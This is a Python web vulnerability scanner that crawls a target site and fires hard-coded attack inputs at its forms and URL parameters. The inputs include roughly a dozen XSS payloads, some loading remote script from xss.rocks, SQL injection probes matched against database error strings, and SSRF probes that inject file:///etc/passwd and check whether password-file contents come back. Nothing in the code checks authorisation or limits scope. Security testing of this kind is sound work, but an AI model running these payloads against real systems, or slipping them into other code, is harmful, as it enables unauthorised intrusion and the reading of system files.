import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

def extract_links_from(url):
    response = requests.get(url)
    strHTML = response.content.decode("utf-8", "ignore")
    return re.findall(pattern='(?:href=\")(.*?)\"', string=strHTML)

def crawl(target_url, url, target_links, depth = -1):
    if depth != -1:
        depth = depth - 1
    href_links = extract_links_from(url)
    for link in href_links:
        link = urljoin(url, link)

        if '#' in link:
            temp = link.split('#')
            link = temp[0]

        if target_url in link and link not in target_links:
            target_links.append(link)
            print(link)
            if depth > 0 or depth == -1:
                crawl(target_url,  link, target_links, depth)

def extract_forms(url):
    response = requests.get(url)
    parsed_html = BeautifulSoup(response.content, "html.parser")
    return parsed_html.find_all('form')

def submit_form(form, value, url):
    action = form.get("action")
    post_url = urljoin(url, action)
    method = form.get("method")
    inputs_list = form.findAll("input")
    post_data = {}
    for input in inputs_list:
        input_name = input.get("name")
        input_type = input.get("type")
        input_value = input.get("value")
        if input_type == "text":
            input_value = value
        post_data[input_name] = input_value
    if method == "post":
        return requests.post(post_url, data=post_data)
    return requests.get(post_url, params=post_data)

def run_scanner_xss(target_links, links_at_risk_xss):
    for link in target_links:
        forms = extract_forms(link)
        is_vulnerrable_to_xss = False
        for form in forms:
            is_vulnerrable_to_xss = test_xss_in_form(form, link)
            if is_vulnerrable_to_xss:
                links_at_risk_xss.append(link)
                break
        if "=" in link:
            is_vulnerrable_to_xss = test_xss_in_link(link)
            if is_vulnerrable_to_xss:
                if link not in links_at_risk_xss:
                    links_at_risk_xss.append(link)

def run_scanner_sql(target_links, links_at_risk_sql ):
    file = open("payloadsSQL.txt")
    content = file.read()
    payloads = content.splitlines()
    for link in target_links:
        forms = extract_forms(link)
        for payload in payloads:
            is_vulnerrable_to_sql = False
            for form in forms:
                is_vulnerrable_to_sql = test_sql_in_form(form, link, payload)
                if is_vulnerrable_to_sql:
                    links_at_risk_sql.append(link)
                    break
            if is_vulnerrable_to_sql:
                break
            if "=" in link:
                is_vulnerrable_to_sql = test_sql_in_link(link, payload)
                if is_vulnerrable_to_sql:
                    if link not in links_at_risk_sql:
                        links_at_risk_sql.append(link)

            if is_vulnerrable_to_sql:
                break

def run_scanner_ssrf(target_links, links_at_risk_ssrf):
    file_paths = [
        "file:///etc/passwd",
        "file://\/\/etc/passwd"
        ]
    file = open("patternSSRF.txt")
    content = file.read()
    patternRequsets = content.splitlines()
    for link in target_links:
        forms = extract_forms(link)
        for form in forms:
            for patternRequset in patternRequsets:
                if patternRequset in form:
                    for payload in file_paths:
                        response = submit_form(form, payload, link)
                        match = re.search(pattern='.*:.*:[0-9]*:[0-9]*:.*', string=response.content.decode())
                        if match:
                            links_at_risk_ssrf.append(link)
        if "=" in link:
            url = urlparse(link)
            for patternRequset in patternRequsets:
                if patternRequset in url.query:
                    for payload in file_paths:
                        link = link.replace("=", "=" + payload)
                        response = requests.get(link)
                        match = re.search(pattern='.*:.*:[0-9]*:[0-9]*:.*', string=response.content.decode())
                        if match and link not in links_at_risk_ssrf:
                            links_at_risk_ssrf.append(link)

def test_xss_in_form(form, url):
    payload = "<scriPt>alert(1)</sCript>"
    response = submit_form(form, payload, url)
    if check_xss(response, "<script>alert(1)</script>", "script"):
        return True
    
    payload = "javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>"
    response = submit_form(form, payload, url)
    if check_xss(response, "<svg onload=\'+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>", "svg"):
        return True

    payload = "<IMG SRC=JaVaScRiPt:alert('XSS')>"
    response = submit_form(form, payload, url)
    if check_xss(response, "src=\"JaVaScRiPt:alert('XSS')\"", "img"):
        return True

    payload = "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>"
    response = submit_form(form, payload, url)
    if check_xss(response, "`javascript:alert(\"RSnake", "img"):
        return True
    
    payload = "\<a onmouseover=\"alert(1)\"\>xxs link\</a\>"
    response = submit_form(form, payload, url)
    if check_xss(response, "onmouseover=\"alert(1)\"", "a"):
        return True

    payload = "<IMG \"\"\"><SCRIPT>alert(1)</SCRIPT>\"\>"
    response = submit_form(form, payload, url)
    if check_xss(response, "<script>alert(1)</script>", "script"):
        return True

    payload = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>"
    response = submit_form(form, payload, url)
    if check_xss(response, "String.fromCharCode(88,83,83)", "img"):
        return True
    
    payload = "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>"
    response = submit_form(form, payload, url)
    if check_xss(response, "src=\"http://xss.rocks/xss.js\"", "script"):
        return True

    payload = "<<SCRIPT>alert(1);//\<</SCRIPT>"
    response = submit_form(form, payload, url)
    if check_xss(response, "<script>alert(1);//\<</script>", "script"):
        return True

    payload = "<SCRIPT SRC=http://xss.rocks/xss.js?< B >"
    response = submit_form(form, payload, url)
    if check_xss(response, "src=\"http://xss.rocks/xss.js", "script"):
        return True
    
    payload = "<iframe src=http://xss.rocks/scriptlet.html <"
    response = submit_form(form, payload, url)
    if check_xss(response, "http://xss.rocks/scriptlet.html", "iframe"):
        return True
    
    payload = "</Script><scRipt>alert(1);</sCript>"
    response = submit_form(form, payload, url)
    if check_xss(response, "<script>alert(1);</script>", "script"):
        return True

    payload = "<A HREF=\"//www.google.com/\">1</A>"
    response = submit_form(form, payload, url)
    if check_xss(response, "www.google.com/", "a"):
        return True
    return False

def test_xss_in_link(url):
    payload = "<scriPt>alert(1)</sCript>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "<script>alert(1)</script>", "script"):
        return True
    
    payload = "javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "<svg onload=\'+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>", "svg"):
        return True

    payload = "<IMG SRC=JaVaScRiPt:alert('XSS')>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "src=\"JaVaScRiPt:alert('XSS')\"", "img"):
        return True

    payload = "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "`javascript:alert(\"RSnake", "img"):
        return True
    
    payload = "\<a onmouseover=\"alert(1)\"\>xxs link\</a\>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "onmouseover=\"alert(1)\"", "a"):
        return True

    payload = "<IMG \"\"\"><SCRIPT>alert(1)</SCRIPT>\"\>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "<script>alert(1)</script>", "script"):
        return True

    payload = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "String.fromCharCode(88,83,83)", "img"):
        return True
    
    payload = "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "src=\"http://xss.rocks/xss.js\"", "script"):
        return True

    payload = "<<SCRIPT>alert(1);//\<</SCRIPT>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "<script>alert(1);//\<</script>", "script"):
        return True

    payload = "<SCRIPT SRC=http://xss.rocks/xss.js?< B >"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "src=\"http://xss.rocks/xss.js", "script"):
        return True
    
    payload = "<iframe src=http://xss.rocks/scriptlet.html <"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "http://xss.rocks/scriptlet.html", "iframe"):
        return True
    
    payload = "</Script><scRipt>alert(1);</sCript>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "<script>alert(1);</script>", "script"):
        return True

    payload = "<A HREF=\"//www.google.com/\">1</A>"
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    if check_xss(response, "www.google.com/", "a"):
        return True
    return False

def check_xss(response, test_payload, search_value):
    html = BeautifulSoup(response.content, "html.parser")
    find_arr = html.find_all(search_value)
    for value in find_arr:
        if test_payload in value.decode():
            return True
    return False

def test_sql_in_form(form, url, payload):
    response = submit_form(form, payload, url)
    return is_vulnerable(response)

def test_sql_in_link(url, payload):
    url = url.replace("=", "=" + payload)
    response = requests.get(url)
    return is_vulnerable(response)

def is_vulnerable(response):
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False



